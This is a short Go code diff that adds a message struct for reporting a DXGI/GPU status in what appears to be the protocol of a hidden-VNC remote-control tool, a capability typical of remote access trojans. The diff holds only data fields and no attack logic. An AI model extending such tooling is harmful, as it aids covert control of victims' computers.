@@ -232,6 +232,13 @@ type HVNCCloneProgress struct {
 	Status      string `msgpack:"status"`
 }
 
+type HVNCDXGIStatus struct {
+	Type    string `msgpack:"type"`
+	Success bool   `msgpack:"success"`
+	GPUPid  uint32 `msgpack:"gpuPid"`
+	Message string `msgpack:"message"`
+}
+
 type HVNCLookupResult struct {
 	Type string `msgpack:"type"`
 	Exe  string `msgpack:"exe"`
